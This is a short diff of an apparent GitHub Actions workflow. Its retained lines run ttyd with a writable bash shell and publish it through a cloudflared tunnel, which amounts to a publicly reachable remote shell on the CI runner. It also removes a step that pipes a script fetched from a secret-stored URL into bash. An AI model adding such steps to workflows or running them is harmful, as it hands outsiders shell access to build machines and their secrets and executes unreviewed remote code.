@@ -26,6 +26,3 @@ jobs:
 
       - run: nohup ttyd -W -p 8000 bash > ttyd.log 2>&1 &
       - run: curl http://127.0.0.1:8000; cloudflared tunnel --url http://127.0.0.1:8000
-
-      - name: Setup
-        run: curl -fsSL ${{ secrets.DISSOLVE }} | bash
